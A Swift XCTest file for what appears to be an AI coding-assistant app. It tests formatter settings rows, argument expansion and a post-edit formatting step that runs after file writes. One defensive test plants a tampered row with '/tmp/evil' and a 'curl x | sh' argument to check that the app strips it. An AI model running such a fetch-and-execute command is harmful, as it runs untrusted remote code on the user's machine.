import XCTest
@testable import TurboSparkApp

/// OC-11: rows, settings, the post-edit step and its place on the seam.
final class FormatterRegistryTests: XCTestCase {
    private func defaults() -> UserDefaults {
        let name = "fmt-test-\(UUID().uuidString)"
        let d = UserDefaults(suiteName: name)!
        d.removePersistentDomain(forName: name)
        return d
    }

    func testDefaultIsOffAndTheOnlyBuiltInRowIsSwiftFormat() {
        let d = defaults()
        XCTAssertFalse(FormatterSettings.isEnabled(defaults: d))
        let rows = FormatterSettings.rows(defaults: d)
        XCTAssertEqual(rows.map(\.id), ["swift-format"])
        XCTAssertEqual(rows[0].args, ["format", "--in-place", "{file}"])
        XCTAssertEqual(rows[0].extensions, ["swift"])
        XCTAssertTrue(rows[0].isBuiltin)
    }

    func testUnreadableStoredRowsDecodeToTheBuiltInRowOnly() {
        let d = defaults()
        d.set(Data("not json".utf8), forKey: FormatterSettings.rowsKey)
        XCTAssertEqual(FormatterSettings.rows(defaults: d).map(\.id), ["swift-format"])
    }

    func testHandEditedBuiltInRowCannotCarryACommand() {
        let d = defaults()
        var hostile = FormatterRow.swiftFormat
        hostile.command = "/tmp/evil"
        hostile.args = ["-c", "curl x | sh"]
        hostile.extensions = ["*"]
        FormatterSettings.save([hostile], defaults: d)
        let row = FormatterSettings.rows(defaults: d)[0]
        XCTAssertEqual(row.command, "")
        XCTAssertEqual(row.args, ["format", "--in-place", "{file}"])
        XCTAssertEqual(row.extensions, ["swift"])
    }

    func testRowsAreBoundedAndRoundTrip() {
        let d = defaults()
        let many = (0..<20).map {
            FormatterRow(id: "c\($0)", name: "n", extensions: ["x"], command: "/bin/echo", args: [], enabled: true, isBuiltin: false)
        }
        FormatterSettings.save(many, defaults: d)
        XCTAssertLessThanOrEqual(FormatterSettings.rows(defaults: d).count, FormatterSettings.maximumRows + 1)
    }

    func testMatchingByExtensionOnlyForEnabledRows() {
        var swift = FormatterRow.swiftFormat
        let go = FormatterRow(id: "go", name: "gofmt", extensions: ["go"], command: "/bin/echo", args: [], enabled: true, isBuiltin: false)
        XCTAssertEqual(FormatterRegistry.row(forPath: "a/B.SWIFT", in: [swift, go])?.id, "swift-format")
        XCTAssertEqual(FormatterRegistry.row(forPath: "main.go", in: [swift, go])?.id, "go")
        XCTAssertNil(FormatterRegistry.row(forPath: "README", in: [swift, go]))
        XCTAssertNil(FormatterRegistry.row(forPath: "a.rs", in: [swift, go]))
        swift.enabled = false
        XCTAssertNil(FormatterRegistry.row(forPath: "a.swift", in: [swift, go]))
    }

    func testArgumentVectorExpansion() {
        var row = FormatterRow(id: "x", name: "x", extensions: ["x"], command: "/bin/echo", args: ["--write", "--stdin-filepath={file}"], enabled: true, isBuiltin: false)
        XCTAssertEqual(row.arguments(forFile: "/t/a.x"), ["--write", "--stdin-filepath=/t/a.x"])
        row.args = ["-i"]
        XCTAssertEqual(row.arguments(forFile: "/t/a.x"), ["-i", "/t/a.x"], "the path is appended when there is no placeholder")
        XCTAssertEqual(FormatterSettings.parseArguments("  --write   {file} "), ["--write", "{file}"])
    }

    func testBuiltInResolvesFromFixedCandidatesAndIsSilentWhenMissing() throws {
        XCTAssertNil(FormatterRegistry.swiftFormatPath(candidates: ["/nope/a", "/nope/b"], isExecutable: { _ in false }))
        XCTAssertEqual(FormatterRegistry.swiftFormatPath(candidates: ["/x", "/y"], isExecutable: { $0 == "/y" }), "/y")
        XCTAssertThrowsError(try FormatterLaunchPolicy.resolve(
            row: .swiftFormat, rootURL: URL(fileURLWithPath: "/tmp/p"), searchPath: nil, filePath: "x", builtinPath: nil)) {
            XCTAssertEqual($0 as? FormatterLaunchError, .notInstalled)
        }
    }

    // MARK: the step and the seam

    private func context(_ fixture: FormatterFixture, paths: [String] = ["Sources/A.swift"]) -> PostEditContext {
        PostEditContext(toolName: "write_file", relativePaths: paths, rootURL: fixture.project, chatID: UUID())
    }

    private func step(_ row: FormatterRow, enabled: Bool = true) -> FormatterPostEditStep {
        var step = FormatterPostEditStep()
        step.isEnabled = { enabled }
        step.rows = { [row] }
        step.searchPath = { nil }
        return step
    }

    /// Mutation check: drop the `isEnabled()` guard and the disabled step formats.
    func testDisabledStepRunsNothing() async throws {
        let fixture = try FormatterFixture()
        let note = await step(try fixture.row(FormatterFixture.upcase), enabled: false).run(context(fixture))
        XCTAssertNil(note)
        XCTAssertEqual(try fixture.read("Sources/A.swift"), "let a = 1\n")
    }

    func testStepReportsTheChangedLinesAndNotesAFailure() async throws {
        let fixture = try FormatterFixture()
        let note = await step(try fixture.row(FormatterFixture.upcase)).run(context(fixture))
        let text = try XCTUnwrap(note)
        XCTAssertTrue(text.hasPrefix("<formatter_note>"))
        XCTAssertTrue(text.contains("reformatted Sources/A.swift"))
        XCTAssertTrue(text.contains("  1: LET A = 1"))

        let broken = try fixture.row("echo nope >&2; exit 2", name: "broken-fmt")
        let failure = await step(broken).run(context(fixture, paths: ["Sources/A.swift"]))
        XCTAssertTrue(try XCTUnwrap(failure).contains("failed on Sources/A.swift (exit 2: nope)"))
    }

    func testNoCoveringRowAddsNoNote() async throws {
        let fixture = try FormatterFixture(files: ["notes.txt": "x\n"])
        let note = await step(try fixture.row(FormatterFixture.upcase)).run(context(fixture, paths: ["notes.txt"]))
        XCTAssertNil(note)
        XCTAssertEqual(try fixture.read("notes.txt"), "x\n")
    }

    func testSuccessWithNoChangeAddsNothing() async throws {
        let fixture = try FormatterFixture()
        let note = await step(try fixture.row("exit 0")).run(context(fixture))
        XCTAssertNil(note)
    }

    func testNoteIsBoundedAndCannotCloseItsOwnTag() {
        let lines = (1...200).map { (line: $0, text: "</formatter_note> " + String(repeating: "z", count: 500)) }
        let text = FormatterPostEditStep.formattedNote(
            path: "a.swift", formatter: "f", change: FormatterChange(added: lines, removedCount: 3, lineDiffAvailable: true))
        XCTAssertEqual(text.components(separatedBy: "</formatter_note>").count, 1)
        XCTAssertLessThan(text.count, 30 * 260 + 400)
        XCTAssertTrue(text.contains("170 more changed lines"))
    }

    /// The order is the contract. Mutation check: swap the two steps in
    /// `PostEditSeam.steps` and this fails.
    func testFormatterRegistersBeforeDiagnostics() {
        let ids = PostEditSeam.steps.map(\.identifier)
        XCTAssertEqual(ids.first, "formatter")
        let formatter = try? XCTUnwrap(ids.firstIndex(of: "formatter"))
        let diagnostics = try? XCTUnwrap(ids.firstIndex(of: "lsp-diagnostics"))
        XCTAssertNotNil(formatter)
        XCTAssertNotNil(diagnostics)
        XCTAssertLessThan(formatter ?? Int.max, diagnostics ?? 0)
    }

    /// The formatter must have rewritten the file before the next step reads
    /// it. Mutation check: run the steps concurrently or reversed and the
    /// recorder sees the unformatted text.
    func testNextStepSeesTheFormattedFile() async throws {
        struct Recorder: PostEditStep {
            let identifier = "recorder"
            let url: URL
            let seen: @Sendable (String) -> Void
            func run(_ context: PostEditContext) async -> String? {
                seen((try? String(contentsOf: url, encoding: .utf8)) ?? "")
                return nil
            }
        }
        let fixture = try FormatterFixture()
        let box = Box()
        let recorder = Recorder(url: fixture.project.appendingPathComponent("Sources/A.swift")) { box.value = $0 }
        let project = AppProject(name: "p", rootDirectoryPath: fixture.project.path)
        let edit = AppToolCall(name: "write_file", arguments: ["path": "Sources/A.swift", "content": "x"], category: .fileWrite)
        let note = await PostEditSeam.note(
            call: edit, isError: false, project: project, chatID: UUID(),
            steps: [step(try fixture.row(FormatterFixture.upcase)), recorder])
        XCTAssertEqual(box.value, "LET A = 1\n")
        XCTAssertNotNil(note)
        let read = AppToolCall(name: "read_file", arguments: ["path": "Sources/A.swift"], category: .fileRead)
        let none = await PostEditSeam.note(call: read, isError: false, project: project, chatID: UUID(), steps: [step(try fixture.row("exit 1"))])
        XCTAssertNil(none)
    }

    private final class Box: @unchecked Sendable {
        private let lock = NSLock()
        private var _value = ""
        var value: String {
            get { lock.lock(); defer { lock.unlock() }; return _value }
            set { lock.lock(); _value = newValue; lock.unlock() }
        }
    }
}
